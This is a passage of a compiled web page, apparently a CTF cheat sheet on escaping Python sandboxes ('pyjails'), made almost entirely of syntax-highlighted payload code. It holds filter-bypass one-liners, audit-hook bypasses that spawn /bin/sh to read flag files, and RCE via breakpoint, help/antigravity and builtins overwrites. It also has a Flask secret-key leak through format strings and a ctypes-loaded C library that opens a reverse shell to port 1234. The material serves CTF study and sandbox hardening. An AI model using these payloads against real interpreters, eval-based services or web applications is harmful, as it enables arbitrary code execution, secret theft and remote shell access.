punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D634}<span class="token operator">+</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)</span>
<span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span>d<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3Fdoc\uFF3F_<span class="token punctuation">,</span>o<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span>h<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>s<span class="token operator">+</span>h<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fgetitem\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>o<span class="token operator">+</span>s<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fgetitem\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fpos\uFF3F_ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F<span class="token keyword">class</span>\uFF3F_<span class="token punctuation">.</span>_\uFF3Fmro\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3Fsubclasses\uFF3F_<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code>`,wc,cs,Qa,gr,vc,ls,Zg=`<code class="language-py"><span class="token keyword">import</span> sys<span class="token punctuation">,</span> os
sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token keyword">lambda</span> <span class="token operator">*</span><span class="token keyword">_</span><span class="token punctuation">:</span> x<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>_exit<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840</span></code>`,Ec,us,Xg=`<code class="language-py"><span class="token comment"># https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5</span>
<span class="token comment"># https://github.com/python/cpython/issues/115322</span>
<span class="token keyword">import</span> readline
readline<span class="token punctuation">.</span>read_history_file<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>readline<span class="token punctuation">.</span>get_history_item<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> _posixsubprocess
errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># python 3.10, may differ in other versions</span>
_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> subprocess
errpipe_read<span class="token punctuation">,</span> errpipe_write <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># python 3.10, may differ in other versions</span>
subprocess<span class="token punctuation">.</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> errpipe_read<span class="token punctuation">,</span> errpipe_write<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>

<span class="token keyword">import</span> multiprocessing<span class="token punctuation">.</span>util <span class="token comment"># underlying uses _posixsubprocess</span>
multiprocessing<span class="token punctuation">.</span>util<span class="token punctuation">.</span>spawnv_passfds<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"cat /flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># More techniques at https://github.com/Nambers/python-audit_hook_head_finder</span>
<span class="token comment"># + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc</span></code>`,hc,rs,sp,wr,xc,ks,Qg='<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>',Cc,is,s2=`<code class="language-py"><span class="token comment"># walrus operator (>= python3.8)</span>
<span class="token punctuation">[</span>a<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># lambda</span>
<span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">)</span> <span class="token comment"># note that argument names aren't part of co_names</span>

<span class="token comment"># setattr</span>
<span class="token builtin">setattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>

<span class="token comment"># list comprehension</span>
<span class="token punctuation">[</span>cobj <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span></code>`,Lc,_s,np,vr,Tc,ds,n2=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Ac,fs,a2=`<code class="language-py"><span class="token comment"># eval</span>
<span class="token comment"># getattr</span>
<span class="token builtin">getattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
obj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">)</span>

<span class="token comment"># vars() and |=</span>
x <span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span> <span class="token comment"># add attributes of tuple into vars (concat) -> same as (x := x|vars(tuple))</span>
l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("__builtins__", "__getattribute__") - retrieve keys with underscore in name</span>
b <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># __builtins__ - could have shorten into l[0] if [] is available</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span> bu <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment"># &lt;module 'builtins' (built-in)> - could have shorten into x[b] here aswell</span>
l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("breakpoint") - retrieve "breakpoint"</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">;</span> brs <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># breakpoint</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span>
br <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>bu<span class="token punctuation">)</span><span class="token punctuation">,</span> brs<span class="token punctuation">)</span> <span class="token comment"># &lt;built-in function breakpoint></span>
br<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># exec</span>
<span class="token comment"># match</span>
<span class="token keyword">match</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">case</span> <span class="token builtin">object</span><span class="token punctuation">(</span>_\uFF3Fdoc\uFF3F_<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span>

<span class="token comment"># try...except</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
  <span class="token string">"&#123;0.__doc__.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># format string by itself can also be used to leak values</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
  a <span class="token operator">=</span> e<span class="token punctuation">.</span>obj
  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment"># ().__doc__</span>

<span class="token comment"># overwrite builtins</span>
__builtins__ <span class="token operator">=</span> sys
__builtins__ <span class="token operator">=</span> modules
__builtins__ <span class="token operator">=</span> os
system<span class="token punctuation">(</span><span class="token string">"cat /flag.txt"</span><span class="token punctuation">)</span></code>`,Oc,ms,ap,Er,Fc,bs,p2=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Rc,ys,t2=`<code class="language-py"><span class="token comment"># list comprehension (exec &amp; eval)</span>
<span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>obj<span class="token punctuation">[</span><span class="token string">"print(123)"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">eval</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># from builtin modules (exec &amp; eval) - &lt;class '_sitebuiltins.Quitter'>, &lt;class '_sitebuiltins._Printer'>, &lt;class '_sitebuiltins._Helper'></span>
<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>license<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> license<span class="token punctuation">.</span>_Printer__setup <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>copyright<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> copyright<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__str__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">+</span>license <span class="token keyword">for</span> license<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token operator">-</span>quit <span class="token keyword">for</span> quit<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__neg__ <span class="token keyword">in</span> <span class="token punctuation">[</span>breakpoint<span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"ls"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @hashkitten (exec)</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> system <span class="token keyword">as</span> __getattr__<span class="token punctuation">;</span> <span class="token keyword">from</span> __main__ <span class="token keyword">import</span> sh</code>`,Ic,gs,pp,hr,Dc,ws,o2=`<code class="language-py"><span class="token comment"># exec</span>
<span class="token comment"># try...except</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    p
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> delete_me<span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span>

<span class="token comment"># del</span>
delete_me <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">del</span> delete_me
<span class="token keyword">print</span><span class="token punctuation">(</span>delete_me<span class="token punctuation">)</span> <span class="token comment"># error</span></code>`,jc,vs,tp,xr,Nc,Es,op,Cr,Pc,F,ut,R,Lr,Tr,b,rt,Ar,Or,kt,Fr,Rr,it,Ir,Dr,_t,jr,Nr,dt,Pr,z,ft,mt,Hr,Ur,hs,bt,Mr,Sr,I,Br,Hc,xs,ep,qr,Uc,Cs,yt,D,zr,Mc,Ls,cp,Wr,Sc,w,gt,Yr,Gr,lp,Vr,wt,$r,Jr,up,Kr,y,rp,vt,Zr,Xr,Qr,kp,Et,sk,nk,ak,ip,ht,pk,tk,ok,E,xt,ek,ck,Ct,lk,uk,Lt,rk,kk,Tt,ik,_k,_p,dk,At,fk,mk,dp,bk,j,yk,Bc,Ts,e2=`<code class="language-py"><span class="token comment"># load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># help()</span>
pdb <span class="token comment"># load pdb into imported modules</span>
app <span class="token comment"># the name of the main program in order to import / "rerun" the program</span>
<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">155</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"pdb"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_trace<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># sys.modules["pdb"].set_trace()</span>

<span class="token comment"># overwrite BROWSER env for RCE through antigravity in help</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>1for <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"BROWSER"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'/bin/sh -c "cat /flag.txt" #%s'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
antigravity</code>`,qc,As,fp,gk,zc,Os,c2=`<code class="language-py"><span class="token comment"># leak and access attributes with format string</span>
<span class="token keyword">import</span> numpy
<span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'SECRET'</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span>
        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username
    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;User &#123;u.username&#125; (id &#123;&#123;i.id&#125;&#125;)>'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>u<span class="token operator">=</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">=</span>self<span class="token punctuation">)</span>
user <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'&#123;i.__init__.__globals__[app].secret_key&#125;'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>

<span class="token comment"># on another, it is also possible to get RCE w/ file upload or write access if the ctypes module is loaded</span>
<span class="token comment"># - https://corgi.rip/posts/buckeye-writeups/#gentleman</span>
<span class="token comment"># - https://ctf.gg/blog/buckeyectf-2024/gentleman</span>
<span class="token comment"># - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared</span>

<span class="token comment"># essentially, write .so / .dll file to system first and then load it as a c library for RCE</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \\\\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'</span>localhost\\<span class="token string">', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system(\\'</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh\\<span class="token string">')\\\\"");&#92;n&#125;'</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gcc -shared -fPIC /tmp/lib.c -o lib.so"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Wc,Fs,mp,wk,Yc,Rs,l2=`<code class="language-py"><span class="token comment"># @salvatore-abello - type.__subclasses__(type)[0] -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"breakpoint"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># need __import__</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;function __newobj__ at 0x7f0000000000> - need __import__ tho</span>
<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__reduce_ex__<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
